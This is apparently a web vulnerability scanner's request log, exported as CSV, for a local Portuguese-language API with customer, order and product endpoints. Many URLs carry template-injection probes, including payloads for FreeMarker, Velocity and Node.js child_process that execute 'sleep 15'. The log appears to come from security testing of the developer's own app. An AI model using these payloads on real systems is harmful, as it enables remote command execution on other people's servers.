ID,Requisição de Timestamp,Timestamp de Resposta,Método,URL,Código,Motivo,RTT,Tamanho do Cabeçalho da Resposta,Tamanho do Corpo da Resposta
3853,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,5,183,388
3854,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Cliente,400,Bad Request,5,182,41
3855,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,DELETE,http://localhost:3000/api/Cliente?nome=nome&numeroCelular=numeroCelular&endereco=zj%7B3349*1853%7Dzj,400,Bad Request,6,182,37
3856,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Cliente,400,Bad Request,6,182,41
3857,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,7,182,67
3858,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,6,183,388
3859,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,GET,http://localhost:3000/api/Cliente/zj%7B%7Bprint+%229477%22+%222517%22%7D%7Dzj,400,Bad Request,7,183,270
3860,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,DELETE,http://localhost:3000/api/Cliente?nome=nome&numeroCelular=numeroCelular&endereco=zj%24%7B8943*1618%7Dzj,400,Bad Request,9,182,37
3861,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Cliente,400,Bad Request,3,182,41
3862,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,4,183,388
3863,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Cliente,400,Bad Request,2,182,41
3864,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,DELETE,http://localhost:3000/api/Cliente?nome=nome&numeroCelular=numeroCelular&endereco=zj%23%7B2378*1660%7Dzj,400,Bad Request,2,182,37
3865,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,6,183,388
3866,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,DELETE,http://localhost:3000/api/Cliente?nome=nome&numeroCelular=numeroCelular&endereco=zj%7B%234843*6093%7Dzj,400,Bad Request,5,182,37
3867,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Cliente,400,Bad Request,7,182,41
3868,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,3,183,388
3869,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,DELETE,http://localhost:3000/api/Cliente?nome=nome&numeroCelular=numeroCelular&endereco=zj%7B%405611*2789%7Dzj,400,Bad Request,5,182,37
3870,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,2,183,388
3871,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Cliente,400,Bad Request,2,182,41
3872,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Cliente,400,Bad Request,1,182,41
3873,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,2,183,388
3874,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,DELETE,http://localhost:3000/api/Cliente?nome=nome&numeroCelular=numeroCelular&endereco=zj%7B%7B2312*1558%7D%7Dzj,400,Bad Request,4,182,37
3875,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Cliente,400,Bad Request,2,182,41
3876,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,3,183,388
3877,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Cliente,400,Bad Request,2,182,41
3878,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,4,183,388
3879,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,DELETE,http://localhost:3000/api/Cliente?nome=nome&numeroCelular=numeroCelular&endereco=zj%7B%7B%3D5316*7690%7D%7Dzj,400,Bad Request,4,182,37
3880,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,3,182,67
3881,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,2,183,388
3882,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,DELETE,http://localhost:3000/api/Cliente?nome=nome&numeroCelular=numeroCelular&endereco=zj%3C%25%3D8470*5537%25%3Ezj,400,Bad Request,3,182,37
3883,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,2,183,388
3884,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,3,183,388
3885,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,DELETE,http://localhost:3000/api/Cliente?nome=nome&numeroCelular=numeroCelular&endereco=zj%23set%28%24x%3D3949*3240%29%24%7Bx%7Dzj,400,Bad Request,4,182,37
3886,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,3,183,388
3887,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,DELETE,http://localhost:3000/api/Cliente?nome=nome&numeroCelular=numeroCelular&endereco=zj%3Cp+th%3Atext%3D%22%24%7B7668*1387%7D%22%3E%3C%2Fp%3Ezj,400,Bad Request,4,182,37
3888,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,3,183,388
3889,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,DELETE,http://localhost:3000/api/Cliente?nome=nome&numeroCelular=numeroCelular&endereco=zj%7B%40math+key%3D%222212%22+method%3D%22multiply%22+operand%3D%229102%22%2F%7Dzj,400,Bad Request,3,182,37
3890,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,3,183,388
3891,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,3,183,388
3892,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,DELETE,http://localhost:3000/api/Cliente?nome=nome&numeroCelular=numeroCelular&endereco=zj%7B%7B48690%7Cadd%3A79540%7D%7Dzj,400,Bad Request,5,182,37
3893,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,3,182,67
3894,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,2,183,388
3895,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,3,183,388
3896,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,DELETE,http://localhost:3000/api/Cliente?nome=nome&numeroCelular=numeroCelular&endereco=zj%7B%7Bprint+%227772%22+%226780%22%7D%7Dzj,400,Bad Request,5,182,37
3897,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,2,183,388
3898,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,2,183,388
3899,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,3,183,388
3900,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,3,183,388
3901,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,2,183,388
3902,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,2,182,67
3903,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,2,183,388
3904,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,1,183,388
3905,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,2,183,388
3906,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,2,182,67
3907,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,2,182,67
3908,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,2,182,67
3909,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,1,182,74
3910,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,2,182,74
3911,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,2,182,74
3912,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,2,182,74
3913,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,1,182,74
3914,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,2,182,74
3915,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,2,182,74
3916,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,2,182,74
3917,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,1,182,74
3918,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,2,182,74
3919,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,2,182,74
3920,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,1,182,74
3921,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,2,182,74
3922,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,1,182,74
3923,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,1,183,375
3924,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,2,183,375
3925,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,1,183,375
3926,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,2,183,375
3927,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,1,183,375
3928,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,2,183,375
3929,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,1,183,375
3930,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,1,183,375
3931,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,1,183,375
3932,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,2,183,375
3933,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,2,183,375
3934,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,1,183,376
3935,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,1,183,375
3936,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,2,183,375
3937,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,1,183,418
3938,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,1,183,418
3939,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,2,183,418
3940,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,2,183,418
3941,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,1,183,418
3942,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,2,183,418
3943,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,1,183,418
3944,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,2,183,418
3945,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,2,183,418
3946,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,2,183,418
3947,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,1,183,419
3948,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,2,183,419
3949,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,1,183,418
3950,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,2,183,418
3951,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,GET,http://localhost:3000,404,Not Found,1,132,0
3952,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Cliente,400,Bad Request,2,182,58
3953,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,2,183,388
3954,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,2,182,67
3955,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,GET,http://localhost:3000/api,404,Not Found,0,132,0
3956,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,DELETE,http://localhost:3000/api/Cliente?nome=%3C%23assign+ex%3D%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E+%24%7B+ex%28%22sleep+15%22%29+%7D&numeroCelular=numeroCelular&endereco=endereco,400,Bad Request,4,182,37
3957,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,2,183,389
3958,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Cliente,400,Bad Request,3,182,58
3959,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,GET,http://localhost:3000/api/Cliente,405,Method Not Allowed,2,162,0
3960,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,2,182,67
3961,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Cliente,400,Bad Request,1,182,58
3962,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,2,183,389
3963,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,GET,http://localhost:3000/api/Pedido,405,Method Not Allowed,1,154,0
3964,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,2,182,67
3965,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,DELETE,http://localhost:3000/api/Cliente?nome=%23set%28%24engine%3D%22%22%29%0A%23set%28%24proc%3D%24engine.getClass%28%29.forName%28%22java.lang.Runtime%22%29.getRuntime%28%29.exec%28%22sleep+15%22%29%29%0A%23set%28%24null%3D%24proc.waitFor%28%29%29%0A%24%7Bnull%7D&numeroCelular=numeroCelular&endereco=endereco,400,Bad Request,3,182,37
3966,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Cliente,400,Bad Request,2,182,58
3967,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,GET,http://localhost:3000/api/Cliente/%3C%23assign+ex%3D%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E+%24%7B+ex%28%22sleep+15%22%29+%7D,400,Bad Request,3,183,319
3968,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,1,183,389
3969,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,2,182,67
3970,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Cliente,400,Bad Request,3,182,58
3971,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,DELETE,http://localhost:3000/api/Cliente?nome=%7B%7B%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29+%7D%7D&numeroCelular=numeroCelular&endereco=endereco,400,Bad Request,4,182,37
3972,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,GET,http://localhost:3000/api/Cliente/%23set%28%24engine%3D%22%22%29%0A%23set%28%24proc%3D%24engine.getClass%28%29.forName%28%22java.lang.Runtime%22%29.getRuntime%28%29.exec%28%22sleep+15%22%29%29%0A%23set%28%24null%3D%24proc.waitFor%28%29%29%0A%24%7Bnull%7D,400,Bad Request,4,183,390
3973,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,4,183,389
3974,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,GET,http://localhost:3000/api/Pedido/%3C%23assign+ex%3D%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E+%24%7B+ex%28%22sleep+15%22%29+%7D,404,Not Found,4,132,0
3975,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,3,182,67
3976,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Cliente,400,Bad Request,2,182,58
3977,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,GET,http://localhost:3000/api/Cliente/%7B%7B%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29+%7D%7D,400,Bad Request,3,183,328
3978,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,2,183,389
3979,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,GET,http://localhost:3000/api/Pedido/%23set%28%24engine%3D%22%22%29%0A%23set%28%24proc%3D%24engine.getClass%28%29.forName%28%22java.lang.Runtime%22%29.getRuntime%28%29.exec%28%22sleep+15%22%29%29%0A%23set%28%24null%3D%24proc.waitFor%28%29%29%0A%24%7Bnull%7D,404,Not Found,3,132,0
3980,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,3,182,67
3981,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,DELETE,http://localhost:3000/api/Cliente?nome=%3C%25%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%25%3E&numeroCelular=numeroCelular&endereco=endereco,400,Bad Request,5,182,37
3982,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Cliente,400,Bad Request,2,182,58
3983,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,GET,http://localhost:3000/api/Pedido/%7B%7B%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29+%7D%7D,404,Not Found,2,132,0
3984,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,GET,http://localhost:3000/api/Cliente/%3C%25%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%25%3E,400,Bad Request,3,183,327
3985,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,3,183,389
3986,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,GET,http://localhost:3000/api/Pedido/%3C%25%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%25%3E,404,Not Found,5,132,0
3987,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,GET,http://localhost:3000/api/Cliente/%23%7Bglobal.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%7D,400,Bad Request,5,183,324
3988,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,6,182,67
3989,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Cliente,400,Bad Request,5,182,58
3990,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,5,183,388
3991,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,GET,http://localhost:3000/api/Pedido/%23%7Bglobal.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%7D,404,Not Found,2,132,0
3992,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,DELETE,http://localhost:3000/api/Cliente?nome=%23%7Bglobal.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%7D&numeroCelular=numeroCelular&endereco=endereco,400,Bad Request,8,182,37
3993,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,GET,http://localhost:3000/api/Cliente/%7B%7Brange.constructor%28%22return+eval%28%5C%22global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%5C%22%29%22%29%28%29%7D%7D,400,Bad Request,3,183,371
3994,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,2,183,388
3995,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Cliente,400,Bad Request,3,182,58
3996,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,GET,http://localhost:3000/api/Pedido/%7B%7Brange.constructor%28%22return+eval%28%5C%22global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%5C%22%29%22%29%28%29%7D%7D,404,Not Found,1,132,0
3997,Sun Jun 23 11:50:26 BRT 2024,Sun Jun 23 11:50:26 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,3,182,67
